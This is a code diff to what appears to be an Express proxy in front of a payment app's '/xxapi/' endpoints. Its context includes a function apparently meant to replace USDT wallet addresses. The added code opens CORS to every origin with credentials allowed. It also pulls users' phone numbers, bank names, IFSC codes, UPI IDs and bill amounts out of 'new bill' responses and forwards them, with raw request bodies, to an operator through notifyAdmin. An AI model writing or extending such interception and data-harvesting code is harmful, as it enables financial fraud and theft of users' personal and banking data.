@@ -319,6 +319,15 @@ function replaceUsdtAddress(obj, newAddr, depth) {
 }
 
 app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
+  res.header('Access-Control-Allow-Headers', '*');
+  res.header('Access-Control-Allow-Credentials', 'true');
+  if (req.method === 'OPTIONS') return res.sendStatus(200);
+  next();
+});
+
+app.use((req, res, next) => {
   if (req.method === 'GET' || req.method === 'HEAD') return next();
   const chunks = [];
   req.on('data', c => chunks.push(c));
@@ -1009,6 +1018,23 @@ app.all('/xxapi/*', async (req, res) => {
 👤 User: ${userId || 'N/A'}
 📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1000) : 'empty'}
 📋 Response: ${respBody.substring(0, 500)}
+🕐 ${now}`);
+    }
+
+    if (urlLower.includes('notifynewbill') || urlLower.includes('notify_new_bill') || urlLower.includes('newbill')) {
+      let billInfo = '';
+      if (jsonResp && typeof jsonResp === 'object') {
+        const d = jsonResp.data || jsonResp.body || jsonResp.result || jsonResp;
+        const fields = ['billId','orderId','orderNo','amount','money','fromTimestamp','phone','mobile','account','bankName','ifsc','upiId'];
+        for (const f of fields) {
+          if (d[f] !== undefined && d[f] !== null && d[f] !== '') billInfo += `\n  ${f}: ${d[f]}`;
+        }
+      }
+      notifyAdmin(data,
+`🔔 NEW BILL NOTIFICATION
+👤 User: ${userId || 'N/A'}${billInfo}
+📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 800) : 'empty'}
+📋 Response: ${respBody.substring(0, 400)}
 🕐 ${now}`);
     }
 
